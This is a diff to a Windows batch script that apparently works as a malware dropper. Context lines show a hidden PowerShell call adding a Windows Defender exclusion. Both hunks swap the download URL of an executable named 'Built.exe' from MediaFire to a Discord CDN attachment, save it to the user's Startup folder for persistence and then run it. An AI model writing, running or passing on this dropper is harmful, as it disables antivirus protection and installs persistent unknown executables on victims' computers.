@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
+set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1254542849727529071/Built.exe?ex=6679df93&is=66788e13&hm=1eed75c7a3110f757814fd6a8aa4d88d0b8ee0aaff8249e0e82928d9e88ceb12&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
+set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1254542849727529071/Built.exe?ex=6679df93&is=66788e13&hm=1eed75c7a3110f757814fd6a8aa4d88d0b8ee0aaff8249e0e82928d9e88ceb12&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
